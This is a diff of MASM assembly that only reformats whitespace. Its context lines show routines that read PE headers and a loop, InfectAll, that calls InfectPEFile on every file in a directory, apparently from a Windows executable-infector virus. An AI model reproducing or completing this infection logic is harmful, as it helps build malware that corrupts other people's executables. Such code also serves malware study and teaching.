@@ -225,11 +225,11 @@ GetPEHeaderInfo	proc	lpFileName:dword,hEditCtrl:HWND
 		invoke SetWindowText,hEditCtrl,addr szErrorOpenFile
 		ret
 	.endif
-    ;handle distance_to_move out_p_distance_to_move_high dwMoveMethod
+	;handle distance_to_move out_p_distance_to_move_high dwMoveMethod
 	invoke	SetFilePointer,@hFile,3ch,NULL,FILE_BEGIN
-    ;handle out_pbuffer num_of_bytes_to_read out_lp_num_of_bytes_read inout_lpoverlapped
+	;handle out_pbuffer num_of_bytes_to_read out_lp_num_of_bytes_read inout_lpoverlapped
 	invoke	ReadFile,@hFile,addr @dwPEHeaderOffset,sizeof DWORD,addr @dwFileReadWritten,0
-    ; get PE offset
+	; get PE offset
 
 	invoke	SetFilePointer,@hFile,@dwPEHeaderOffset,NULL,FILE_BEGIN
 	invoke	ReadFile,@hFile,addr @ImageNtHeaders,sizeof IMAGE_NT_HEADERS,addr @dwFileReadWritten,0
@@ -432,7 +432,7 @@ InfectAll proc
 		invoke	SendMessage,hEdit,EM_REPLACESEL,0,addr notfound
 		ret
 	.else
-		mov hSearch, eax
+		mov hSearch,eax
 	.endif
 
 	.if !(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
@@ -446,9 +446,9 @@ InfectAll proc
 
 nextfile:
 	invoke FindNextFile,hSearch,ADDR wfd
-	cmp eax, 0
-     je InfectAllEnd
-     .if !(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+	cmp eax,0
+	je InfectAllEnd
+	.if !(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
 		invoke	lstrcpy,addr szFileName,addr wfd.cFileName
 		invoke	InfectPEFile
 		invoke	wsprintf,addr szBuffer,offset fmt,addr wfd.cFileName,eax
@@ -456,7 +456,7 @@ nextfile:
 		invoke	SendMessage,hEdit,EM_SETSEL,eax,eax
 		invoke	SendMessage,hEdit,EM_REPLACESEL,0,addr szBuffer
 	.endif
-     jmp nextfile
+	jmp nextfile
 
 InfectAllEnd:
 	invoke FindClose,hSearch
